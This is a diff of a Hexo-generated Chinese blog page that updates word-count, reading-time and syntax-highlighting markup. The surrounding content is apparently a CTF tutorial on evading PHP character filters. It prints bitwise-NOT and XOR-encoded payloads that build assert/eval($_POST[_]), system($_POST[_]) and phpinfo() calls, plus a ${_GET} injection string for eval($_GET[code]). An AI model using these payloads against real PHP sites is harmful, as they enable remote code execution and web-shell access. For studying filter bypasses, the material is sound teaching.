@@ -252,14 +252,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>7.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -312,7 +312,7 @@
 <figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># assert  %9E%8C%8C%9A%8D%8B</span><br><span class="line"># (<span class="keyword">eval</span>($_POST[_]))  %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%A0%A2%D6%D6</span><br><span class="line"># (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%A0%A2%D6%D6);</span><br><span class="line">#即 (assert)((<span class="keyword">eval</span>($_POST[_])));</span><br></pre></td></tr></table></figure>
 
 <p>构造<code>phpinfo();</code></p>
-<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="attr"># phpinfo  %8</span>F<span class="meta">%</span><span class="number">97</span><span class="meta">%</span><span class="number">8</span>F<span class="meta">%</span><span class="number">96</span><span class="meta">%</span><span class="number">91</span><span class="meta">%</span><span class="number">99</span><span class="meta">%</span><span class="number">90</span></span><br><span class="line"><span class="attr"># (~%8</span>F<span class="meta">%</span><span class="number">97</span><span class="meta">%</span><span class="number">8</span>F<span class="meta">%</span><span class="number">96</span><span class="meta">%</span><span class="number">91</span><span class="meta">%</span><span class="number">99</span><span class="meta">%</span><span class="number">90</span>)<span class="comment">()</span>;   <span class="attr">#即为 phpinfo();</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"># phpinfo  <span class="variable">%8</span>F<span class="variable">%97</span><span class="variable">%8</span>F<span class="variable">%96</span><span class="variable">%91</span><span class="variable">%99</span><span class="variable">%90</span></span><br><span class="line"># (~<span class="variable">%8</span>F<span class="variable">%97</span><span class="variable">%8</span>F<span class="variable">%96</span><span class="variable">%91</span><span class="variable">%99</span><span class="variable">%90</span>)()<span class="comment">;   #即为 phpinfo();</span></span><br></pre></td></tr></table></figure>
 
 <p>另一种方式构造<code>system($_POST[_])</code></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = ~(%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>);   <span class="comment">#定义变量$_为system</span></span><br><span class="line"><span class="variable">$__</span> = ~(%A0%AF%B0%AC%AB);  <span class="comment">#定义变量$__为_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">#定义变量$___为$$__，即为$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">#即为 assert($_POST[_]);</span></span><br><span class="line"><span class="comment">#将取反结果代入</span></span><br><span class="line"><span class="comment"># $_ = ~(%8C%86%8C%8B%9A%92);$__ = ~(%A0%AF%B0%AC%AB);$___ = $$__;$_($___[_]);</span></span><br></pre></td></tr></table></figure>
@@ -333,7 +333,7 @@
 <img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223347.png" alt="image-20250119103540779" style="zoom:50%;" />
 
 <p>已知<code>_,G,E,T</code>字符可以如下构成</p>
-<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">_:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>d<span class="number">9</span></span><br><span class="line">G:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>c<span class="number">1</span></span><br><span class="line">E:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>c<span class="number">3</span></span><br><span class="line">T:<span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>d<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">_:<span class="variable">%86</span>^<span class="variable">%d9</span></span><br><span class="line">G:<span class="variable">%86</span>^<span class="variable">%c1</span></span><br><span class="line">E:<span class="variable">%86</span>^<span class="variable">%c3</span></span><br><span class="line">T:<span class="variable">%86</span>^<span class="variable">%d2</span></span><br></pre></td></tr></table></figure>
 
 <p>构造执行<code>phpinfo()</code>的payload</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[code]);</span><br><span class="line"><span class="comment"># ?code=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span></span><br></pre></td></tr></table></figure>
@@ -527,12 +527,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">NaNm</span>
+    <span title="站点总字数">284k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">NaN:aN</span>
+    <span title="站点阅读时长">4:18</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
